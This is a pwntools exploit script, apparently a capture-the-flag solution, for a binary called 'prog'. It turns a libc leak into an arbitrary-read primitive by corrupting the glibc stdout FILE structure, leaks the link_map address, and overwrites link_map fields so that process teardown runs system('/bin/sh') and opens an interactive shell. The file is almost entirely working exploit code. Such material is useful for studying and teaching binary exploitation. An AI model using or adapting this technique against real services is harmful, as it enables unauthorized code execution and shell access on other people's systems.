#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")

#context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=-1', '--geometry=128x98+2900+0', '-e']
context.terminal = ['alacritty', '--title=GDB-Pwn','-o', 'window.dimensions.lines=76', '-o', 'window.dimensions.columns=150', '-o', 'window.position.x=2800', '-o', 'window.position.y=0','-o','font.size=8.0','-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./prog')
libc = ELF('./libc.so.6')

host, port = "127.0.0.1", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef.bata24.git/gef.py
    gef config context.show_opcodes_size 9
    si
    b *_dl_call_fini+94
    c
     ''')
  else:
    p = process(exe.path)


def write(addr, data):
  sla('choice> ', '1')
  sla('> ', str(addr))
  sla('size> ', str(len(data))+'\x00')
  sa('data> ', data)

libc.address = int(rcu('leak: ','\n'),16)-libc.sym['_IO_2_1_stdout_']
logbase()

# stdout read primitive
def readmem(stdout_addr, addr, size, returned=0):
  temp = p64(0xfbad1887) + p64(0)*3 + p64(addr) + p64(addr + size)*3 + p64(addr + size +1)
  write(stdout_addr, temp)
  if returned:
    return p.read(size)

map = u64(readmem(libc.sym['_IO_2_1_stdout_'], libc.address+0x1fdff0, 16, 1)[0:8])
print('link_map address = '+hex(map))

target = map+0xa8
payload = p64(target)+p64(0x10000000000000000+(libc.sym['system']-u64(b'/bin/sh\x00')))
write(target, payload)
write(map,p64(u64('/bin/sh\x00')))

p.interactive()

